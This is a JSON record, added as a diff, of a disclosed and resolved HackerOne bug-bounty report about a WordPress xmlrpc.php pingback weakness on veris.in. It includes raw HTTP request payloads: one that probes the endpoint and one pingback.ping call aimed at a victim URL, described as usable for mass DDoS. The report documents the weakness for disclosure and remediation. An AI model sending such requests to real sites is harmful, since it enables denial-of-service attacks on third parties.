@@ -1,0 +1,104 @@
+{
+  "id": 124097,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjQwOTc=",
+  "url": "https://hackerone.com/reports/124097",
+  "title": "Wordpress  Pingback  DDoS Attacks in domain:  veris.in",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-03-17T20:56:58.447Z",
+  "submitted_at": "2016-03-17T20:56:58.447Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "aziose",
+    "url": "/aziose",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/037/936/fdbd1976d94361fdd8c8660680d04b9ee8c30110_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 9409,
+    "url": "https://hackerone.com/veris",
+    "handle": "veris",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/009/409/c1806c3bc995d97dd0aa437c2e42eb609f49e549_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/009/409/c1806c3bc995d97dd0aa437c2e42eb609f49e549_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Veris",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2016-06-12T16:08:41.431Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2016-05-13T16:08:28.842Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi team,\n\nWordpress blogs that have xmlrpc.php enabled for pingbacks, trackbacks, etc. can be made as a part of a huge botnet causing a major DDOS. The website veris.in has the xmlrpc.php file enabled and could thus be potentially used for such an attack against other victim hosts.\n\nPoC:\n====\nIn order to determine whether the xmlrpc.php file is enabled or not, using the Repeater tab in Burp proxy, send the request below:\n```\nPOST /xmlrpc.php HTTP/1.1 \nHost: veris.in \nConnection: keep-alive \nContent-Length: 175\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?> \n<methodCall> \n<methodName>demo.sayHello</methodName> \n<params> \n<param>\n<value>admin</value>\n</param> \n</params> \n</methodCall>\n```\n\n- Notice that a successful response is received showing that the xmlrpc.php file is enabled.\n\n \n- The xmlrpc.php file discussed above could potentially be abused to cause a DDOS attack against a victim host. This is achieved by simply sending a request that looks like below:\n\n```\nPOST /xmlrpc.php HTTP/1.1 \nHost: veris.in\nConnection: keep-alive \nContent-Length: 293\n\n<methodCall>\n<methodName>pingback.ping</methodName>\n<params>\n<param>\n<value><string>http://victim.com</string></value>\n</param>\n<param>\n<value><string>https://veris.in/anypost</string></value>\n</param>\n</params>\n</methodCall>\n```\n- As soon as the above request is sent, the victim host gets an entry in its log file with a request originating from the veris.in domain verifying the pingback.\n\n- This can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim.\n\n- If the XMLRPC.php file is not being used, it should be disabled and removed completely to avoid any potential risks. \n\nMore info: https://blog.sucuri.net/2014/03/more-than-162000-wordpress-sites-used-for-distributed-denial-of-service-attack.html\n\nregards,",
+  "weakness": {
+    "id": 48,
+    "name": "Denial of Service"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2016-06-12T16:08:28.914Z",
+  "allow_singular_disclosure_after": -242078051.81421164,
+  "singular_disclosure_allowed": true,
+  "vote_count": 4,
+  "voters": [
+    "muslimfrompk",
+    "mayurudiniya",
+    "dyabla",
+    "eknuthdavis"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
